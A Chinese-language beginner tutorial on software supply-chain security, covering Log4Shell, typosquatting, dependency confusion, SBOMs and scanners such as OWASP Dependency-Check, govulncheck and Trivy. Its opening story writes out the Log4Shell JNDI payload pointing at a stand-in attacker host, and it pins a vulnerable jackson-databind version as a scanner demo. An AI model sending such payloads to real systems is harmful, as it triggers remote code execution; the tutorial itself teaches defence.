---
title: "Day 18：軟體供應鏈安全 — 相依套件漏洞與 SBOM"
date: 2026-05-14
tags: ["供應鏈安全", "相依套件", "DevSecOps"]
---

# Day 18：軟體供應鏈安全 — 相依套件漏洞與 SBOM

> **適合對象**：後端工程師初學者
> **語言範例**：Java（1.8 / 21）、Go
> **OWASP 對應**：A06:2021 - Vulnerable and Outdated Components

---

## 一、開場故事：一行依賴搞垮半個網路

2021 年 12 月，全世界資安工程師度過了人生中最忙的一個聖誕節。

起因是一個叫 **Log4j2** 的 Java 日誌函式庫，被發現一個漏洞 **CVE-2021-44228（Log4Shell）**。
攻擊者只需要在請求中放一段奇怪的字串：

```
${jndi:ldap://attacker.com/evil}
```

被 Log4j 記錄下來，伺服器就會**自動連到攻擊者的 LDAP server，下載並執行任意程式碼**。等同於整台機器被攻陷。

更可怕的是：**幾乎所有 Java 系統都用 Log4j。** Spring、Elasticsearch、Kafka、Minecraft 伺服器…全部中招。許多公司加班到天亮，只為了升級一個小小的 jar。

> **教訓**：你的系統再安全，只要你**用的別人的程式碼有洞**，你就有洞。
> 這就是「軟體供應鏈攻擊」要解決的問題。

---

## 二、什麼是「軟體供應鏈」？

現代後端開發，**80% 以上的程式碼不是你寫的**。

你 `pom.xml` 寫一行：

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <version>3.2.0</version>
</dependency>
```

實際拉下來的可能是**幾百個 jar 檔**，每一個 jar 都可能再相依其他 jar——這叫「**傳遞性相依（transitive dependencies）**」。

Go 也是一樣：

```
go.mod 寫 5 行
go.sum 卻有 200 行
```

你的應用程式 = 你的程式碼 + 一大堆別人的程式碼。
**任何一個別人的程式碼有漏洞，你的系統就有漏洞。**

---

## 三、常見的供應鏈攻擊類型

### 1. 已知漏洞（Known Vulnerabilities, CVE）

最常見。某個套件被發現漏洞，發布到 [NVD 資料庫](https://nvd.nist.gov/) 後，攻擊者就會去掃描沒升級的網站。

**範例**：Log4Shell、Spring4Shell、Struts2 OGNL、Jackson Deserialization、Fastjson…

### 2. Typosquatting（名稱仿冒）

攻擊者上傳一個跟熱門套件**長得很像**的惡意套件。

```
真的：requests
假的：reqursts、reqests、request-py
```

工程師打錯字、複製貼上錯誤，就裝到惡意套件。

### 3. Dependency Confusion（依賴混淆）

公司內部用 `company-utils` 這個內部套件名稱。
攻擊者去公開 registry（如 npm、PyPI、Maven Central）發佈同名套件並設更高版本，套件管理器可能**優先抓公開的那個**——惡意程式碼就跑進了內網。

### 4. Maintainer Takeover / 惡意更新

熱門 OSS 維護者帳號被駭，或是維護者本人在新版本悄悄加入惡意程式碼。

**真實案例**：
- 2018 年 `event-stream` (npm)：新維護者偷加入竊取比特幣錢包的程式碼。
- 2024 年 `xz-utils` 後門：差點害整個 Linux 生態系中招。

### 5. 過期 / 不再維護的套件

雖然沒有惡意，但作者已經放棄維護。出了漏洞也不會修，等於永遠的計時炸彈。

---

## 四、怎麼做？— 防禦四步驟

### Step 1：建立 SBOM（軟體物料清單）

**SBOM = Software Bill of Materials**

把「我用了哪些套件、什麼版本、誰提供的」全部列清單。出事時才能快速判斷「我有沒有受影響？」

業界標準格式有兩種：**CycloneDX**、**SPDX**。

### Step 2：自動掃描漏洞

把 SBOM 跟 CVE 資料庫比對，找出已知漏洞。

### Step 3：升級 / 替換 / 隔離

依嚴重程度排序處理。CVSS 9.0 以上的高危漏洞優先。

### Step 4：CI/CD 自動阻擋

讓「有高危漏洞的版本」**無法 merge 進主分支**。

---

## 五、Java 實戰：OWASP Dependency-Check

[OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) 是免費、開源的掃描工具，支援 Java/JS/.NET 等。截至 2026 年仍持續維護（最新 12.x 版）。

### 1. Maven 整合

在 `pom.xml` 加入：

```xml
<build>
    <plugins>
        <plugin>
            <groupId>org.owasp</groupId>
            <artifactId>dependency-check-maven</artifactId>
            <version>12.1.0</version>
            <configuration>
                <!-- 出現 CVSS >= 7 就讓 build 失敗 -->
                <failBuildOnCVSS>7</failBuildOnCVSS>
                <formats>
                    <format>HTML</format>
                    <format>JSON</format>
                    <format>SARIF</format>
                </formats>
            </configuration>
            <executions>
                <execution>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

執行：

```bash
mvn dependency-check:check
```

它會：
1. 掃描所有 jar 的 hash
2. 對照 NVD 漏洞資料庫
3. 產出報表（`target/dependency-check-report.html`）
4. 若有高危漏洞，**build 直接失敗**

### 2. 用 Spring Boot 範例看效果

```xml
<!-- 故意用一個有名的舊版本 -->
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.9.0</version>   <!-- 多個高危 CVE -->
</dependency>
```

執行 `mvn dependency-check:check` 後會看到：

```
[ERROR] One or more dependencies were identified with vulnerabilities that have a CVSS score greater than or equal to 7.0:

jackson-databind-2.9.0.jar (pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.9.0)
  CVE-2020-36518 (CVSS: 7.5) - Java StackOverflow exception ...
  CVE-2022-42003 (CVSS: 7.5) - In FasterXML jackson-databind ...
```

> **小提示**：第一次跑會下載 NVD 資料庫（約 200MB+），可能花 10 分鐘以上。後續會增量更新。

---

## 六、Go 實戰：govulncheck（官方工具）

Go 官方在 2022 年推出了 **govulncheck**，截至 2026 年仍由 Go Team 主動維護。

### 1. 安裝

```bash
go install golang.org/x/vuln/cmd/govulncheck@latest
```

### 2. 在專案中執行

```bash
cd /path/to/your/go-project
govulncheck ./...
```

### 3. 為什麼 govulncheck 比較聰明？

一般工具只看「你用的版本有沒有漏洞」。
**govulncheck 會做靜態分析**：判斷「你的程式碼**有沒有實際呼叫到**那個有漏洞的函數」。

範例輸出：

```
Vulnerability #1: GO-2024-1234
  HTTP smuggling vulnerability in net/http
  More info: https://pkg.go.dev/vuln/GO-2024-1234
  Standard library
    Found in: net/[email protected]
    Fixed in: net/[email protected]
    Example traces found:
      #1: main.go:42:18: main.main calls http.ListenAndServe, which eventually calls ...
```

**好處**：減少誤報。如果你只是引入了套件但沒呼叫到漏洞函數，govulncheck 不會吵你。

### 4. 整合到 CI

`.github/workflows/security.yml`：

```yaml
name: Security Scan
on: [push, pull_request]
jobs:
  govulncheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'
      - name: Install govulncheck
        run: go install golang.org/x/vuln/cmd/govulncheck@latest
      - name: Run govulncheck
        run: govulncheck ./...
```

---

## 七、跨語言推薦工具：Trivy

[Trivy](https://github.com/aquasecurity/trivy) 是 Aqua Security 出的開源掃描器，可以掃描：
- 容器映像（Docker image）
- 檔案系統 / Git repo
- IaC 設定（Terraform、K8s manifest）
- 各種語言的相依套件（Java / Go / Node / Python…）

截至 2026 年仍由 Aqua Security 大力維護（GitHub 28k+ stars）。

### 範例：掃 Docker image

```bash
trivy image my-spring-app:1.0.0
```

輸出（簡化）：

```
my-spring-app:1.0.0 (alpine 3.18.0)
Total: 12 (HIGH: 8, CRITICAL: 4)

┌───────────────┬──────────────┬──────────┬─────────────────┬────────────────────────┐
│   Library     │ Vulnerability│ Severity │ Installed Ver.  │ Fixed Version          │
├───────────────┼──────────────┼──────────┼─────────────────┼────────────────────────┤
│ openssl       │ CVE-2023-...│ CRITICAL │ 3.1.0-r0        │ 3.1.4-r0               │
│ log4j-core    │ CVE-2021-...│ CRITICAL │ 2.14.1          │ 2.17.1                 │
└───────────────┴──────────────┴──────────┴─────────────────┴────────────────────────┘
```

### 掃整個 Git repo

```bash
trivy fs --scanners vuln,secret,misconfig .
```

連你不小心 commit 進去的 AWS Key 都會抓出來（呼應 Day 15 的 Secrets Management）。

---

## 八、產生 SBOM

業界標準工具：

### 1. CycloneDX（Maven）

```xml
<plugin>
    <groupId>org.cyclonedx</groupId>
    <artifactId>cyclonedx-maven-plugin</artifactId>
    <version>2.8.0</version>
    <executions>
        <execution>
            <phase>package</phase>
            <goals><goal>makeAggregateBom</goal></goals>
        </execution>
    </executions>
</plugin>
```

執行後會在 `target/bom.json` 產出 SBOM。

### 2. Syft（跨語言、超強）

```bash
syft my-app:1.0.0 -o cyclonedx-json > sbom.json
```

之後可以拿這份 SBOM 餵給 [Grype](https://github.com/anchore/grype) 做漏洞掃描：

```bash
grype sbom:sbom.json
```

> **為什麼要分兩步驟？**
> 出大事時（像 Log4Shell），你需要快速回答老闆「我們有沒有用到 log4j？」。
> 有 SBOM 在手就能秒答；沒有的話得 grep 整個專案。

---

## 九、Github / GitLab 內建工具

如果你的程式碼放在 GitHub，可以**免費**啟用：

### 1. Dependabot

在 repo 根目錄建 `.github/dependabot.yml`：

```yaml
version: 2
updates:
  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  - package-ecosystem: "gomod"
    directory: "/"
    schedule:
      interval: "weekly"
```

Dependabot 會：
- 每週掃描你的相依套件
- 發現新版本/漏洞時，**自動開 PR 升級**
- 在 PR 描述列出 changelog 和漏洞資訊

### 2. CodeQL / Security Alerts

在 Repo → Security → 啟用 Code Scanning。

GitHub 會用 CodeQL 做語意分析，找出潛在的 SQL Injection、Path Traversal 等問題，並發 alert。

---

## 十、日常工作檢核表

最後給你一份**新專案就該做**的檢核清單：

- [ ] **版本固定（lock）**：`pom.xml` 寫精確版本，不要寫 `LATEST` 或 `RELEASE`；Go 要 commit `go.sum`
- [ ] **CI 整合掃描**：每次 push 都跑 Dependency-Check / govulncheck / Trivy
- [ ] **CVSS 閾值**：超過 7.0 直接擋 build
- [ ] **產出 SBOM**：每個 release 都附 SBOM，存到 artifact registry
- [ ] **自動升級**：啟用 Dependabot 或 Renovate
- [ ] **私有 mirror**：用 Nexus / Artifactory 做內部 proxy，避免直接打公開 registry
- [ ] **驗證簽章**：用支援數位簽章的套件（如 Sigstore / cosign）
- [ ] **減少表面**：只裝你真的需要的；定期執行 `mvn dependency:analyze` 找出沒用到的相依
- [ ] **訂閱情資**：CISA 的 [Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)、各語言的 security mailing list

---

## 十一、給初學者的三個重點

1. **「我沒寫的程式碼也是我的責任。」**
   你選擇了某個套件，它的漏洞就是你的漏洞。要負責升級和監控。

2. **「掃描不是一次性，是持續性。」**
   今天乾淨，不代表明天乾淨。每天都有新的 CVE 被揭露。要把掃描放進 CI/CD。

3. **「降低相依數量，本身就是最強的防禦。」**
   每多裝一個 lib，你的攻擊面就多一個。在引入新相依前先問：「我能不能用 10 行程式碼自己做？」

---

## 十二、延伸閱讀

- [OWASP Top 10 - A06:2021](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [Go Vulnerability Database](https://pkg.go.dev/vuln/)
- [NVD - National Vulnerability Database](https://nvd.nist.gov/)
- [Sigstore / cosign 軟體簽章](https://www.sigstore.dev/)

---

> **明日預告（Day 19）**：HTTPS / TLS 基礎 — 為什麼一定要用 HTTPS？憑證怎麼運作？mTLS 又是什麼？

明天見！
